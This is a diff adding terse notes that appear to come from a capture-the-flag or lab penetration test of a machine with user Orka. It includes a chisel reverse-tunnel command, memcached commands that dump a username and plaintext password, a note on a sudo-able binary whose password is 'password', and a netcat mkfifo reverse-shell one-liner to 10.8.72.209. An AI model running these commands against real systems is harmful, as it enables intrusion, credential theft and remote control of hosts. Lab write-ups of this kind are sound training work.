@@ -93,3 +93,32 @@ user Orka
 
 /usr/bin/python /root/server.py
 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1
+
+/etc/ImageMagick-6/mime.xml
+/usr/sbin/alsa-info.sh
+
+
+# In local machine
+chisel server -p 9999 --reverse
+
+# In remote machine
+# replace 10.0.0.1 with your local ip
+chisel client 10.8.72.209:9999 R:8090:127.0.0.1:631
+
+
+in memcached
+
+stats items
+stats cachedump 1 100
+get username : Orka
+get password : OrkAiSC00L24/7$
+
+
+we found sudo rights to /home/Orka/Desktop/bitcoin
+by doing a strings, we found that the password is password
+
+
+
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.72.209 6667 >/tmp/f
+/usr/sbin is writable
+python path is not absolute
